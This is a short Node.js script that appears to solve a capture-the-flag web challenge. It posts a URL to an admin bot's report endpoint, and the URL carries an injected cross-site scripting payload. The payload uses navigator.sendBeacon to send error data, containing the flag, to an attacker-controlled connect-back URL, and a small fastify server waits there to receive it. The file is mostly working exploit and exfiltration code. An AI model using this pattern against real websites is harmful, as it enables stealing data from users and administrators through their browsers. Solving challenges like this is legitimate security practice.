const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const xss = `
window.addEventListener(
  "unhandledrejection",
  (event) => {
    navigator.sendBeacon("${CONNECTBACK_URL}", event.reason);
  },
  { once: true }
);
`.trim();

const url = `http://foobar@web:3000?${new URLSearchParams({ xss })}`;

app.post("/", async (req, reply) => {
  // You got a flag!
  const errorMsg = req.body;
  const flag = decodeURIComponent(errorMsg.split("flag=")[1]);
  console.log({ errorMsg, flag });
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err);

  await sleep(3 * 1000);
  await reportUrl(url);

  await sleep(5 * 1000);
  fail("Failed");
});
